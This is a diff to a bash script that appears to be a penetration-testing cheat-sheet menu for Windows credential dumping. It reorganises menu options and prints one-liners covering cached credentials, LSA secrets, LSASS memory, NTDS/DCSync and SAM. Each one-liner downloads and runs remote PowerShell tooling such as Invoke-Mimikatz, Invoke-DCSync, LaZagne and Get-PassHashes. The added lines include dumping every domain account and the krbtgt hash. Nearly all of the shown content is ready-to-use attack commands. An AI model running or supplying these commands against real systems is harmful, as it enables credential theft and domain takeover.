@@ -143,21 +143,19 @@ echo -ne " Select Credential Dumping Type
 
 
         1)  ->  [ Cached Domain Credentials ]
-        2)  ->  [ DCSync		    ]
-        3)  ->  [ LSA Secrets		    ]
-        4)  ->	[ LSASS Memory		    ]
-        5)  -> 	[ NTDS			    ]
-        6)  ->	[ SAM			    ]
+        2)  ->  [ LSA Secrets		    ]
+        3)  ->	[ LSASS Memory		    ]
+        4)  -> 	[ NTDS			    ]
+        5)  ->	[ SAM			    ]
 "
 
         read a
         case $a in
                 1) 	Internal_Menu_Credential_Access_Credential_Dumping_Cached_Domain_Credentials ;;
-        	2) 	Internal_Menu_Credential_Access_Credential_Dumping_DCSync ;;
-	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
-	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
-	        5) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
-	        6)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
+	        2) 	Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets ;;
+	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
+	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
+	        5)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -177,28 +175,82 @@ echo -e "${IBLUE}LaZagne${RESTORE}"
 echo -e "iex (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::cache"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::cache"\"'"
 echo -e ""
 echo -e ""
 
 }
 
 
-Internal_Menu_Credential_Access_Credential_Dumping_DCSync(){
+Internal_Menu_Credential_Access_Credential_Dumping_LSA_Secrets(){
 
 	clear
 
 echo -e ""
-echo -e ""
+echo -e "" 
 echo -e ""      
-echo -e "${LGREEN}DCSync${RESTORE}"
+echo -e "${LGREEN}LSA Secrets${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::secrets"\"'"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory(){
+
+	clear
+
+echo -e ""
+echo -e "" 
+echo -e ""      
+echo -e "${LGREEN}LSASS Memory${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -DumpCreds"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Dumping_NTDS(){
+	clear
+
+echo -e ""
+echo -e "" 
+echo -e ""      
+echo -e "${LGREEN}NTDS${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-DCSync${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-DCSync.ps1);Invoke-DCSync"
 echo -e ""
 echo -e "${IBLUE}Mimikatz${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:administrator"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:all"\"'"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::dcsync /domain:Security.local /user:krbtgt"\"'"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
+echo -e ""
+echo -e ""
+
+}
+
+
+Internal_Menu_Credential_Access_Credential_Dumping_SAM(){
+
+	clear
+
+echo -e ""
+echo -e "" 
+echo -e ""      
+echo -e "${LGREEN}SAM${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Mimikatz${RESTORE}"
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::sam"\"'"
+echo -e ""
+echo -e "${IBLUE}Nishang${RESTORE}"
+echo -e "$DownloadMethod '$NishangRepo""Gather/Get-PassHashes.ps1');Get-PassHashes"
 echo -e ""
 echo -e ""
 
